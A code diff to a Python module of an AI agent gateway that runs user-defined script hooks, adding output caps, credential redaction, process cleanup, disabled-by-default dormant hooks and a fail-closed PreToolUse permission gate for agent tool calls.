-# stdout/stderr and OOM (or stall) the gateway for every session before the
-# 500-char presentation limit was ever applied (#5442). We now drain each
-# stream incrementally and keep only the first ``_HOOK_STREAM_CAP_BYTES`` bytes,
-# while continuing to read (and discard) the rest so the child can never block
-# on a full pipe. The cap is generously above the 500-char field we surface, so
+# ``await proc.communicate(...)`` buffers BOTH pipes in memory until EOF, so a
+# buggy or hostile hook can emit unbounded stdout/stderr and OOM (or stall) the
+# gateway for every session before the 500-char presentation limit is ever
+# applied. ``run_script_hook`` instead drains each stream incrementally and keeps
+# only the first ``_HOOK_STREAM_CAP_BYTES`` bytes, while continuing to read (and
+# discard) the rest so the child can never block on a full pipe. The cap is
+# generously above the 500-char field we surface, so
 # the retained prefix is always enough to decode and truncate for display, yet
 # small enough that a runaway hook cannot exhaust memory.
 _HOOK_STREAM_CAP_BYTES = 64 * 1024
@@ -3828,11 +4844,15 @@ def _audit_governance_hook_decision(
 
 
 async def run_script_hook(
-    hook: ScriptHook, context: str = "", hook_event: dict | None = None
+    hook: ScriptHook,
+    context: str = "",
+    hook_event: dict | None = None,
+    cwd: str | None = None,
 ) -> ScriptHookResult:
     """Execute a script hook's command with timeout.
 
-    Passes hook event as JSON via STDIN (Kiro CLI compatible).
+    Passes hook event as JSON via STDIN (Kiro CLI compatible). ``cwd`` is the
+    directory the command runs in; ``None`` keeps the gateway's own.
     """
     start = time.monotonic()
     # Governance: the ``capabilities.script_hooks`` gate (default OFF) may forbid
@@ -3842,7 +4862,9 @@ async def run_script_hook(
     sk = ""
     if hook_event:
         sk = str(hook_event.get("parent_session_key") or hook_event.get("session_key") or "")
-    gov_denied = _script_hooks_capability_denied(sk)
+    # Offloaded: resolving the governance scope can walk the profile store, which
+    # must not run on the gateway's shared event loop.
+    gov_denied = await asyncio.to_thread(_script_hooks_capability_denied, sk)
     if gov_denied:
         hook.last_run = time.time()
         hook.last_status = "blocked"
@@ -3864,6 +4886,7 @@ async def run_script_hook(
         hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
     stdin_data = json.dumps(hook_event).encode()
 
+    proc: Any = None
     try:
         # circular import: sandbox → registry → apps → hooks, so import at call time
         from kiro_crew.sandbox import (
@@ -3923,6 +4946,7 @@ async def run_script_hook(
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
                 env=env,
+                cwd=cwd,
                 creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
             )
         else:
@@ -3932,6 +4956,7 @@ async def run_script_hook(
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
                 env=env,
+                cwd=cwd,
                 start_new_session=platform_compat.IS_POSIX,
                 creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
             )
@@ -3953,19 +4978,31 @@ async def run_script_hook(
                     pass
         elapsed = int((time.monotonic() - start) * 1000)
         exit_code = proc.returncode or 0
-        # Decode with the upstream byte cap (#5442) so redaction never sees an
-        # unbounded string, THEN redact the full capped streams through the
-        # canonical companion-aware shim before any truncation or return
-        # (#5441). Both fields are returned by the test API, and stdout can also
-        # become model context for prompt/spawn hooks; redacting the capped text
-        # first prevents a credential that straddles a presentation boundary
-        # (e.g. the 500-char stderr cut for last_error, #4708) from leaking as
-        # an unredacted fragment.
+        # Decode with the upstream byte cap so redaction never sees an unbounded
+        # string, THEN redact the full capped streams through the canonical
+        # companion-aware shim before any truncation or return. Both fields are
+        # returned by the test API, and stdout can also become model context for
+        # prompt/spawn hooks; redacting the capped text first prevents a credential
+        # that straddles a presentation boundary (e.g. the 500-char stderr cut for
+        # last_error) from leaking as an unredacted fragment.
         stdout_text = _decode_capped(stdout_b, stdout_trunc).strip()
         stderr_text = _decode_capped(stderr_b, stderr_trunc).strip()
         stdout_safe = redact_via_context(stdout_text) if stdout_text else ""
         stderr_safe_full = redact_via_context(stderr_text) if stderr_text else ""
-        stderr_safe = stderr_safe_full[:500]
+        # An exit-2 deny reason is authored text and reads from the head; any
+        # other failure is a crash whose diagnosis is printed last, so its
+        # last_error excerpt keeps the tail. When the byte cap fired the real
+        # tail was discarded before decoding, so the head is the only honest
+        # excerpt left, and the truncation marker is re-appended so the excerpt
+        # still says it is clipped. Redaction already ran on the full capped
+        # stream above, so neither cut can sever a secret.
+        if exit_code == 2:
+            stderr_safe = stderr_safe_full[:500]
+        elif stderr_trunc:
+            head_len = 500 - len(_HOOK_TRUNCATION_MARKER)
+            stderr_safe = stderr_safe_full[:head_len] + _HOOK_TRUNCATION_MARKER
+        else:
+            stderr_safe = stderr_safe_full[-500:]
         hook.last_run = time.time()
         if exit_code == 2:
             hook.last_status = "blocked"
@@ -3986,6 +5023,15 @@ async def run_script_hook(
             exit_code=exit_code,
             duration_ms=elapsed,
         )
+    except asyncio.CancelledError:
+        # A cancelled caller (a torn-down session, a cancelled turn) must not leave
+        # the hook running: kill its tree, then let the cancellation propagate.
+        if proc is not None and proc.returncode is None:
+            try:
+                await platform_compat.kill_process_tree_async(proc.pid, platform_compat.SIGKILL)
+            except Exception:
+                logger.debug("hook tree kill on cancel failed", exc_info=True)
+        raise
     except asyncio.TimeoutError:
         # Kill the whole process tree (shell + grandchildren) to prevent orphans.
         # platform_compat: killpg on POSIX, taskkill /T on Windows (os.killpg /
@@ -3998,7 +5044,7 @@ async def run_script_hook(
                 await platform_compat.kill_process_tree_async(proc.pid, platform_compat.SIGKILL)
                 # Reap the killed tree WITHOUT re-buffering: a hook that timed
                 # out having already flooded its pipes must not be able to OOM
-                # us during cleanup (#5442). Drain both pipes concurrently under
+                # us during cleanup. Drain both pipes concurrently under
                 # the same cap and discard; sequential reads can deadlock when
                 # residual data fills the other pipe.
                 await asyncio.gather(
@@ -4044,7 +5090,7 @@ _HOOKS_FILE = "hooks.json"
 class ScriptHookStore:
     """Persist script hooks to ~/.kiro/crew/hooks.json."""
 
-    def __init__(self, config_dir: Path | None = None):
+    def __init__(self, config_dir: Path | None = None, *, load: bool = True):
         from kiro_crew.config.loader import config_dir as _cfg_dir
 
         self._dir = config_dir or _cfg_dir()
@@ -4054,15 +5100,15 @@ class ScriptHookStore:
         # belong to the user. Preserve their raw JSON values across later status
         # and CRUD writes so fail-soft loading does not become silent data loss.
         self._unparsed_hook_entries: list[object] = []
-        # Mutations used to be implicitly serialised by running on the single
-        # event-loop thread. They are now offloaded with asyncio.to_thread (the
-        # persistence takes a file lock and fsyncs, which must not block the
-        # loop), so two of them can genuinely interleave: A mutates, B mutates,
-        # B persists, then A persists a snapshot taken BEFORE B's change and
-        # drops it. Re-entrant because the persist path is called from inside
-        # the same held section.
+        # Mutations are offloaded with asyncio.to_thread (the persistence takes a
+        # file lock and fsyncs, which must not block the loop) rather than being
+        # implicitly serialised on the single event-loop thread, so two of them can
+        # genuinely interleave: A mutates, B mutates, B persists, then A persists a
+        # snapshot taken BEFORE B's change and drops it. Re-entrant because the
+        # persist path is called from inside the same held section.
         self._mutex = threading.RLock()
-        self._load()
+        if load:
+            self._load()
 
     def _load(self) -> None:
         if not self._path.exists():
@@ -4072,6 +5118,9 @@ class ScriptHookStore:
         except (json.JSONDecodeError, OSError) as exc:
             logger.warning("Failed to load hooks: %s", exc)
             return
+        self._load_data(data)
+
+    def _load_data(self, data: object) -> None:
         # Deserialize each hook independently: a single malformed entry (a
         # non-dict, or a dict `from_dict` cannot coerce) must not take down the
         # whole store and drop every OTHER hook the user has. `from_dict` is
@@ -4095,7 +5144,10 @@ class ScriptHookStore:
             try:
                 if not isinstance(h, dict):
                     raise TypeError("hook entry is not an object")
-                if h.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT) not in HOOK_EVENTS:
+                # The full authoring vocabulary, not the fired subset: a hook
+                # stored against a Kiro Agent trigger must survive a reload,
+                # and the narrower set would quarantine it as unparseable.
+                if h.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT) not in HOOK_EVENTS_ALL:
                     raise ValueError("hook entry has an invalid event")
                 hook = ScriptHook.from_dict(h)
                 # Keep insertion inside the per-entry guard: a hand-edited ID
@@ -4120,13 +5172,13 @@ class ScriptHookStore:
         ``hooks.json`` is shared: this store owns the ``hooks`` key, but the
         ``register_hook`` MCP tool stores webhook resume contexts as top-level
         keys (one per hook id) in the same file. Writing ``{"hooks": [...]}``
-        wholesale used to erase all of them, so any script-hook create / update /
-        toggle / delete silently dropped every pending webhook context. Merge
+        wholesale erases all of them, so any script-hook create / update /
+        toggle / delete would silently drop every pending webhook context. Merge
         instead of replace.
 
         An unreadable file ABORTS the write rather than proceeding with "no
-        foreign keys". Continuing was the earlier choice, on the reasoning that
-        the script hooks were still recoverable — but the foreign keys are not:
+        foreign keys". Continuing would leave the script hooks recoverable — but
+        the foreign keys are not:
         a corrupt read means their contents are unknown, and writing the merged
         result would replace the file with only what this store happens to hold,
         permanently erasing every registered webhook context. Refusing leaves
@@ -4199,21 +5251,36 @@ class ScriptHookStore:
         hook = ScriptHook.from_dict(data)
         if not hook.id:
             hook.id = str(uuid.uuid4())[:8]
+        # A hook on an event no event fires is saved OFF unless the caller said
+        # otherwise. Nothing runs it either way today, so this costs the author
+        # nothing now -- and it is the whole activation contract for later: the
+        # change that starts firing these events inherits hooks that are already
+        # disabled, so it cannot silently run a shell command somebody wrote
+        # months earlier and never reconfirmed. ``fire`` skips a disabled hook;
+        # the Test endpoint does not read ``enabled``, so Test still works, which
+        # is the only way one of these runs at all. An explicit ``enabled: true``
+        # is honoured -- that IS the reconfirmation.
+        if "enabled" not in data and hook.event in HOOK_EVENTS_KAS_ONLY:
+            hook.enabled = False
         # Enforce the SAME invariants `update` does, via the shared validator:
-        # a direct/internal caller of `create` used to bypass the command+skills
-        # invariant, event membership, and timeout bounds (only `update` checked
-        # them), so it could persist a hook the update path would reject and that
-        # later silently fails to fire. `from_dict` clamps the timeout on the way
+        # checking them only in `update` lets a direct/internal caller of `create`
+        # bypass the command+skills invariant, event membership and timeout bounds,
+        # persisting a hook the update path would reject and that later silently
+        # fails to fire. `from_dict` clamps the timeout on the way
         # in, but validate against the ORIGINAL `data` so a caller that passed an
         # out-of-range timeout is told rather than having it silently clamped —
         # matching the API schema's reject-don't-clamp behavior. Raises
-        # ValueError (mapped to HTTP 400 by the dashboard handler).
+        # ValueError (mapped to HTTP 400 by the dashboard handler). The matcher is
+        # read from `data` for the same reason as the timeout: `from_dict` drops one
+        # stored against an event no event fires, which is right for a hand-edited
+        # file and wrong for a caller who asked for it -- a POST carrying a matcher
+        # must be told, not silently saved without the filter it named.
         validate_hook_fields(
             event=hook.event,
             timeout=data.get("timeout", hook.timeout),
             command=hook.command,
             skills=hook.skills,
-            matcher=hook.matcher,
+            matcher=str(data.get("matcher", hook.matcher) or ""),
             matcher_mode=hook.matcher_mode,
         )
         with self._mutex, self._atomic_mutation():
@@ -4226,9 +5293,52 @@ class ScriptHookStore:
             hook = self._hooks.get(hook_id)
             if not hook:
                 return None
+            was_dormant = hook.event in HOOK_EVENTS_KAS_ONLY
             for k in ("name", "event", "matcher", "matcher_mode", "command", "timeout", "enabled"):
                 if k in data:
                     setattr(hook, k, data[k])
+            # The activation contract has to hold on BOTH write paths. `create`
+            # stores a hook on one of the six switched off; without this, an edit
+            # moving an ALREADY-ENABLED hook from a live event onto one of the six
+            # kept it enabled, and the change that starts firing these events would
+            # inherit exactly the pre-authorised command the contract exists to
+            # prevent -- reached by an ordinary edit rather than anything exotic.
+            #
+            # Only on the TRANSITION into the set, and only when the caller did not
+            # name `enabled`. A hook already on one of the six keeps whatever state
+            # it has, so editing the command of one somebody deliberately switched
+            # ON does not silently switch it off again -- the edit form always sends
+            # `event`, so keying on presence rather than on the transition would do
+            # exactly that.
+            if (
+                "event" in data
+                and not was_dormant
+                and hook.event in HOOK_EVENTS_KAS_ONLY
+                and "enabled" not in data
+            ):
+                hook.enabled = False
+            # A move onto one of the six also drops a matcher the caller did not
+            # send. `from_dict` applies the same normalization on load, and its note
+            # says why: `update` validates the MERGED fields, so a stored matcher
+            # meeting the pairing refusal leaves a hook that cannot be edited -- or
+            # even switched off -- without the caller also naming a field it never
+            # touched, and the refusal names that field rather than anything the
+            # request carried. A matcher present IN `data` still refuses, exactly as
+            # `create` refuses one: a caller who asks for a filter these events
+            # cannot use is told, not silently saved without it.
+            if (
+                "event" in data
+                and "matcher" not in data
+                and hook.matcher
+                and hook.event in HOOK_EVENTS_KAS_ONLY
+            ):
+                logger.warning(
+                    "hook %s moved onto %s; dropping its matcher (no event fires "
+                    "this, so there is no payload to filter)",
+                    hook.id,
+                    hook.event,
+                )
+                hook.matcher = ""
             if "skills" in data:
                 skills_raw = data["skills"]
                 hook.skills = (
@@ -4283,10 +5393,32 @@ class ScriptHookStore:
         parent_session_key: str | None = None,
         agent_role: str | None = None,
         hook_continuation_count: int = 0,
+        extra_hooks: Sequence[ScriptHook] = (),
+        extra_hooks_cwd: str | None = None,
+        extra_hooks_tool_names: Sequence[str] | None = None,
+        tool_match_names: Sequence[str] | None = None,
     ) -> list[ScriptHookResult]:
         """Fire all enabled hooks matching the given event. Returns results.
 
-        For PreToolUse/PostToolUse, matcher filters by tool name.
+        ``extra_hooks`` run after the stored ones, through the same matcher, gate
+        and spawn, and are never persisted: they belong to the caller (an agent
+        spec's own ``hooks`` on a backend that cannot run them, see
+        :mod:`kiro_crew.agent_sdk.spec_hooks`), not to this store. They run in
+        ``extra_hooks_cwd`` -- the session's workspace, where the harness that
+        would otherwise run them runs them -- and their payload's ``cwd`` says so.
+        ``tool_match_names``, when given, are every name the call is known by (its
+        title, its canonical tool name, its ``@server/tool`` form); a tool matcher
+        then matches when it matches any of them. ``tool_name`` stays what the
+        payload says.
+
+        For PreToolUse/PostToolUse, matcher filters by tool name. When
+        ``extra_hooks_tool_names`` is given, an extra hook's tool matcher is
+        compared with those names instead: the tool's identity in the vocabulary
+        the extra hooks were written in, which ``tool_name`` (the call's title)
+        does not carry. It matches when any name does, and an empty sequence
+        leaves only an unscoped (``*``) extra hook matching. The first name is
+        also the ``tool_name`` an extra hook's stdin payload reports, so a script
+        that branches on it reads the same vocabulary its matcher is written in.
         For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.
 
         Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
@@ -4334,13 +5466,29 @@ class ScriptHookStore:
         if agent_role:
             hook_event["agent_role"] = agent_role
 
-        for hook in list(self._hooks.values()):
+        extra_ids = {id(h) for h in extra_hooks}
+        # The extra hooks' own payload: their workspace as ``cwd``, and on a tool
+        # event the tool named in their vocabulary rather than the call's title.
+        extra_event = dict(hook_event)
+        if extra_hooks_cwd:
+            extra_event["cwd"] = extra_hooks_cwd
+        if extra_hooks_tool_names:
+            extra_event["tool_name"] = extra_hooks_tool_names[0]
+        for hook in [*self._hooks.values(), *extra_hooks]:
             if not hook.enabled or hook.event != event:
                 continue
             # Matcher filtering: for tool hooks, match tool name; for others, match context
             if hook.matcher:
                 if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
-                    if not _tool_matches(hook.matcher, tool_name):
+                    if extra_hooks_tool_names is not None and id(hook) in extra_ids:
+                        if hook.matcher != "*" and not any(
+                            _tool_matches(hook.matcher, name) for name in extra_hooks_tool_names
+                        ):
+                            continue
+                    elif not any(
+                        _tool_matches(hook.matcher, name)
+                        for name in (tool_match_names or (tool_name,))
+                    ):
                         continue
                 elif context:
                     # Offload to a thread: regex mode spawns a bounded subprocess
@@ -4366,7 +5514,9 @@ class ScriptHookStore:
                 # gate as command hooks — a disabled capabilities.script_hooks
                 # must not be bypassable by omitting the command field.
                 sk = parent_session_key or ""
-                gov_denied = _script_hooks_capability_denied(sk)
+                # Off the loop, as in run_script_hook: the scope lookup can walk
+                # the governance profile store.
+                gov_denied = await asyncio.to_thread(_script_hooks_capability_denied, sk)
                 if gov_denied:
                     hook.last_run = time.time()
                     hook.last_status = "blocked"
@@ -4410,7 +5560,12 @@ class ScriptHookStore:
                     len(hook.skills),
                 )
                 continue
-            result = await run_script_hook(hook, context, hook_event)
+            if id(hook) in extra_ids and extra_hooks_cwd:
+                result = await run_script_hook(hook, context, extra_event, cwd=extra_hooks_cwd)
+            elif id(hook) in extra_ids:
+                result = await run_script_hook(hook, context, extra_event)
+            else:
+                result = await run_script_hook(hook, context, hook_event)
             results.append(result)
             logger.info(
                 "Hook %s (%s): %s in %dms (exit=%d)",
@@ -4475,6 +5630,40 @@ def get_global_hook_store() -> ScriptHookStore | None:
     return _global_script_hook_store
 
 
+def persisted_hook_store() -> ScriptHookStore:
+    """The registered hook store, or the Hooks page's saved hooks read from disk.
+
+    A process that registers no store (the standalone ``kirocrew run`` task runner)
+    still has the user's saved hooks in ``hooks.json``. A gate that read them as
+    absent would let a covered call past a deny hook, so gates that must enforce
+    them read this instead of :func:`get_global_hook_store`.
+
+    Strict, unlike the store's own fail-soft load: a ``hooks.json`` that cannot be
+    read or parsed, or that holds an entry the store could not load, raises, so a
+    gate fails closed instead of reading a saved deny hook as absent.
+
+    The file is read ONCE, under the same ``hooks.json.lock`` its writers hold, and
+    that one snapshot is both validated and loaded, so an edit landing mid-read
+    cannot pair one version's shape check with another version's hooks. Blocking
+    I/O: an event-loop caller runs it in a worker thread.
+    """
+    store = get_global_hook_store()
+    if store is not None:
+        return store
+    store = ScriptHookStore(load=False)
+    if not store._path.exists():
+        return store
+    with webhooks.locked(store._path):
+        data = json.loads(store._path.read_text(encoding="utf-8"))
+    hooks_data = data.get("hooks", []) if isinstance(data, dict) else None
+    if not isinstance(hooks_data, list):
+        raise ValueError(f"{store._path} does not hold a hooks list")
+    store._load_data(data)
+    if store._unparsed_hook_entries or len(store._hooks) != len(hooks_data):
+        raise ValueError(f"{store._path} holds hooks that could not be loaded")
+    return store
+
+
 async def fire_tool_hooks(
     hook_store: ScriptHookStore | None,
     event_title: str,
@@ -4521,3 +5710,125 @@ async def fire_tool_hooks(
         )
     except Exception:
         logger.debug("PreToolUse hook error", exc_info=True)
+
+
+def pre_tool_match_names(
+    title: str,
+    *,
+    tool_identity: str = "",
+    mcp_server: str = "",
+    harness_tool_id: str = "",
+) -> tuple[tuple[str, ...], tuple[str, ...] | None]:
+    """The names a PreToolUse matcher meets for one call: ``(all, spec)``.
+
+    *all* is every name the call is known by, for a Hooks-page hook: its *title*,
+    its canonical *tool_identity* (written by the harness, never the model), the
+    ``@server/tool`` and ``mcp__server__tool`` forms built from the trusted
+    *mcp_server*, and the names the harness's own *harness_tool_id* stands for
+    (:func:`kiro_crew.agent_sdk.spec_hooks.spec_hook_tool_names`). *spec* is the
+    same without the title, for a spec hook, whose matcher names tools; ``None``
+    when the harness stated no id, so a spec hook keeps matching the title.
+    """
+    # circular import: spec_hooks imports this module at load time.
+    from kiro_crew.agent_sdk.spec_hooks import spec_hook_tool_names
+
+    harness_names = spec_hook_tool_names(harness_tool_id) or ()
+    trusted = [*harness_names, tool_identity]
+    if mcp_server and tool_identity:
+        trusted += [f"@{mcp_server}/{tool_identity}", f"mcp__{mcp_server}__{tool_identity}"]
+    every = tuple(dict.fromkeys(n for n in [title, *trusted] if n))
+    spec = tuple(dict.fromkeys(n for n in trusted if n)) if harness_names else None
+    return every, spec
+
+
+async def permission_pre_tool_block(
+    hook_store: ScriptHookStore | None,
+    spec_hooks: Sequence[ScriptHook],
+    spec_hooks_cwd: str | None,
+    event_title: str,
+    event_tool_input: str | None = None,
+    *,
+    tool_identity: str = "",
+    mcp_server: str = "",
+    harness_tool_id: str = "",
+    subagent_id: str | None = None,
+    parent_session_key: str | None = None,
+    agent_role: str | None = None,
+) -> str | None:
+    """Run the PreToolUse hooks on a subagent or task-runner permission request.
+
+    For a turn whose backend never receives the agent spec's ``hooks`` (see
+    :func:`kiro_crew.agent_sdk.spec_hooks.turn_spec_hooks`): on that backend the
+    projection turns every call a PreToolUse hook covers into a permission
+    request, so this is where the hooks gate. The Hooks page's hooks and the
+    spec's run together, as on the chat turn loop. Such a turn skips the
+    informational tool-call fire: KAS sends a call's tool-call frame BEFORE its
+    permission request, and every call a PreToolUse hook covers reaches this gate,
+    so firing there too would run each hook twice. Returns why the call is
+    blocked, or ``None``.
+
+    A hook matcher is compared with every name the call is known by: its title
+    (what the chat turn loop matches), its canonical *tool_identity*
+    (``LLMEvent.tool_name``, written by the harness, never the model) and, for an
+    MCP call, the ``@server/tool`` and ``mcp__server__tool`` forms built from the
+    trusted *mcp_server* (``LLMEvent.mcp_server_name``). When the harness stated
+    its own id for the call (*harness_tool_id*, KAS's ``_meta.kiro.toolId``), the
+    names that id stands for join them
+    (:func:`kiro_crew.agent_sdk.spec_hooks.spec_hook_tool_names`), so a ``web_fetch``
+    hook meets KAS's "Fetch URL". A spec hook then matches those names and the
+    trusted identity only, never the title, as on the chat turn loop.
+
+    Blocks by the same rule the chat turn loop applies: exit 2 is a delivered
+    deny, and any other nonzero exit or a fire that raises is a gate with no
+    verdict, which blocks. With no store registered in this process the saved
+    Hooks-page hooks are read from disk (:func:`persisted_hook_store`), and saved
+    hooks that cannot be read block.
+    """
+    if hook_store is None:
+        # No store registered in this process: the saved hooks still apply.
+        try:
+            # Off the loop: it reads and parses the whole saved file.
+            hook_store = await asyncio.to_thread(persisted_hook_store)
+        except Exception as exc:  # noqa: BLE001 - a gate with no verdict blocks
+            logger.warning("saved PreToolUse hooks could not be read; blocking tool", exc_info=True)
+            return f"saved PreToolUse hooks could not be read: {exc}"[:500]
+    tool_name = event_title or ""
+    if tool_name.startswith("Running: "):
+        tool_name = tool_name[9:]
+    match_names, spec_names = pre_tool_match_names(
+        tool_name,
+        tool_identity=tool_identity,
+        mcp_server=mcp_server,
+        harness_tool_id=harness_tool_id,
+    )
+    tool_input = None
+    if event_tool_input:
+        try:
+            tool_input = json.loads(event_tool_input)
+        except Exception:
+            pass
+    try:
+        results = await hook_store.fire(
+            HOOK_EVENT_PRE_TOOL_USE,
+            tool_name=tool_name,
+            tool_input=tool_input,
+            subagent_id=subagent_id,
+            parent_session_key=parent_session_key,
+            agent_role=agent_role,
+            extra_hooks=spec_hooks,
+            extra_hooks_cwd=spec_hooks_cwd,
+            extra_hooks_tool_names=spec_names,
+            tool_match_names=match_names,
+        )
+    except Exception as exc:  # noqa: BLE001 - a gate with no verdict blocks
+        logger.warning("PreToolUse hook fire failed; blocking tool", exc_info=True)
+        return f"PreToolUse hook could not run: {exc}"[:500]
+    for r in results:
+        if r.exit_code == 2:
+            return f"{r.hook_name}: {r.stderr[:200] if r.stderr else 'hook denied'}"
+        if r.exit_code != 0:
+            detail = (
+                r.error[:200] if r.error else (r.stderr[-200:] or f"exited with code {r.exit_code}")
+            )
+            return f"{r.hook_name}: {detail}"
+    return None
